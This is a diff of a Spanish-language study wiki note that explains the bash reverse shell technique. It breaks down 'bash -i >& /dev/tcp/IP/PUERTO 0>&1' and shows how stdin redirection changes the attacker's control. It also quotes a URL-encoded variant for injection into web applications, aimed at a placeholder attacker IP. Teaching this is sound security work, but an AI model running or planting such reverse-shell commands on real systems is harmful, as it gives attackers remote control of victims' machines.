@@ -1,3 +1,7 @@
+---
+Tema: "[[wiki]]"
+---
+
 # Reverse Shell - Técnica de Conexión Inversa
 
 ## Introducción
@@ -45,19 +49,40 @@ bash -c "bash -i >%26 /dev/tcp/IP_ATACANTE/PUERTO 0>%261"
 > [!tip] Consejo
 > Si estás inyectando este comando en una aplicación web, necesitarás codificar ciertos caracteres especiales. Por ejemplo, el carácter `&` debe ser reemplazado por `%26` en contextos de URL.
 
----
+#### Explicación Detallada del Comando
 
-## Explicación Detallada del Comando
+##### Desglose por componentes:
 
-### Desglose por componentes:
+| Componente           | Descripción                                                                                              |
+| -------------------- | -------------------------------------------------------------------------------------------------------- |
+| `bash -c`            | Ejecuta el comando que sigue como argumento en una nueva instancia de bash                               |
+| `"bash -i"`          | Inicia una shell bash interactiva (`-i`) que permite entrada/salida del usuario                          |
+| `>&`                 | Redirecciona tanto la **salida estándar (1)** como el **error estándar (2)** hacia el destino que sigue. |
+| `/dev/tcp/IP/PUERTO` | Pseudoarchivo especial que crea una conexión TCP al IP y puerto especificados                            |
+| `0>&1`               | Redirige stdin (0) al mismo lugar que stdout (1), completando el circuito de comunicación                |
 
-| Componente           | Descripción                                                                               |
-| -------------------- | ----------------------------------------------------------------------------------------- |
-| `bash -c`            | Ejecuta el comando que sigue como argumento en una nueva instancia de bash                |
-| `"bash -i"`          | Inicia una shell bash interactiva (`-i`) que permite entrada/salida del usuario           |
-| `>&`                 | Redirige tanto stdout (1) como stderr (2)                                                 |
-| `/dev/tcp/IP/PUERTO` | Pseudoarchivo especial que crea una conexión TCP al IP y puerto especificados             |
-| `0>&1`               | Redirige stdin (0) al mismo lugar que stdout (1), completando el circuito de comunicación |
+Si **no** pones `0>&1`, lo que sucede es que **tú no puedes hablarle a Bash**, pero Bash **sí puede hablarte a ti**.
+
+##### El escenario SIN `0>&1`:
+
+Imagina que solo ejecutas: `bash -i >& /dev/tcp/IP/PORT`
+
+1. **Lo que tú ves (Atacante):** En tu pantalla de repente aparece el prompt: `usuario@maquina:~$`. ¡Parece que funciona!
+2. **Tu acción:** Escribes `ls` y pulsas **Enter**.
+3. **El problema:** Tu `ls` viaja por la red, llega a la tarjeta de red de la víctima... **¡y ahí se muere!**.
+4. **Por qué:** Porque el Bash de la víctima está esperando que alguien pulse teclas en su **teclado físico** (su Entrada 0 original). Como no has redirigido su "oreja" (entrada) al cable de red, Bash ni siquiera se entera de que le enviaste un `ls`.
+
+> **En resumen:** Sin `0>&1`, tú ves el monitor de la víctima, pero no puedes usar su teclado. Es como mirar una película por streaming: ves lo que pasa, pero no puedes controlar al protagonista.
+
+##### El escenario CON `0>&1`:
+
+Al añadir esa parte, le dices a Bash: _"Deja de escuchar al teclado físico y empieza a escuchar lo que venga por el mismo cable por el que me estás mandando la imagen del monitor"_.
+
+|**Componente**|**Sin 0>&1**|**Con 0>&1**|
+|---|---|---|
+|**Salida (1)**|Red (Tú ves el prompt)|Red (Tú ves el prompt)|
+|**Entrada (0)**|**Teclado físico de la víctima**|**Red (Tú escribes los comandos)**|
+|**Resultado**|Solo lectura (Mirón)|**Control total (Interactivo)**|
 
 ### Diagrama de redirección de flujos:
 
